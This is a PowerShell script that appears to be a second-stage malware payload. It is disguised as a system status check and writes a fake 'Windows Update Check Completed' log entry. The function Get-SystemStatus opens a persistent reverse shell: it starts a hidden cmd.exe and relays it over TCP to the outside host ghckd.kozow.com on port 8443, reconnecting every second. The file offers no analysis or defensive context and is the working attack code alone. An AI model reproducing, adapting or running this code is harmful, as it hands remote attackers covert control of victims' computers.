$pidFile = "$env:TEMP\stage2_pid.txt"
try {
    $PID | Out-File -FilePath $pidFile -Force
    Write-Host "PID saved: $PID (File: $pidFile)"
}
catch {
    Write-Host "Error saving PID: $($_.Exception.Message)" -ForegroundColor Red
}

function Get-SystemStatus {
    param(
        [string]$Server = "ghckd.kozow.com",
        [int]$Port = 8443
    )

    while ($true) {
        $client = $null
        $stream = $null
        $writer = $null
        $reader = $null
        $process = $null
        $outputReader = $null
        $inputWriter = $null

        try {
            Write-Host "[$(Get-Date)] Attempting to connect to $Server on port $Port..."
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($Server, $Port)
            Write-Host "[$(Get-Date)] Connected successfully!" -ForegroundColor Green

            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.AutoFlush = $true

            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "cmd.exe"
            $psi.UseShellExecute = $false
            $psi.RedirectStandardInput = $true
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.CreateNoWindow = $true
            $psi.WorkingDirectory = "C:\"

            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $psi
            $process.Start() | Out-Null

            $inputWriter = $process.StandardInput
            $outputReader = $process.StandardOutput
            $errorReader = $process.StandardError

            $outputTask = $outputReader.BaseStream.CopyToAsync($stream)
            $errorTask = $errorReader.BaseStream.CopyToAsync($stream)

            while ($client.Connected) {
                if ($stream.DataAvailable) {
                    $data = $reader.ReadLine()
                    if ($data -ne $null) {
                        $inputWriter.WriteLine($data)
                    }
                }

                if (-not $client.Connected -or $client.Client.Poll(0, [System.Net.Sockets.SelectMode]::SelectRead)) {
                    $buffer = New-Object Byte[] 1
                    if ($client.Client.Receive($buffer, [System.Net.Sockets.SocketFlags]::Peek) -eq 0) {
                        throw "Connection lost"
                    }
                }

                Start-Sleep -Milliseconds 100
            }
        }
        catch [System.Net.Sockets.SocketException] {
            Write-Host "[$(Get-Date)] Connection failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "[$(Get-Date)] Retrying in 1 second..." -ForegroundColor Yellow
        }
        catch {
            Write-Host "[$(Get-Date)] Error: $($_.Exception.Message)" -ForegroundColor Yellow
            Write-Host "[$(Get-Date)] Reconnecting in 1 second..." -ForegroundColor Yellow
        }
        finally {
            if ($inputWriter) { try { $inputWriter.Close(); $inputWriter.Dispose() } catch {} }
            if ($outputReader) { try { $outputReader.Dispose() } catch {} }
            if ($errorReader) { try { $errorReader.Dispose() } catch {} }
            if ($process -and -not $process.HasExited) { try { $process.Kill(); $process.Dispose() } catch {} }
            if ($reader) { try { $reader.Dispose() } catch {} }
            if ($writer) { try { $writer.Dispose() } catch {} }
            if ($stream) { try { $stream.Dispose() } catch {} }
            if ($client) { try { $client.Close(); $client.Dispose() } catch {} }
        }

        Start-Sleep -Seconds 1
    }
}

"$(Get-Date): Windows Update Check Completed" | Out-File -FilePath "$env:TEMP\windows_update.log" -Append

Get-SystemStatus
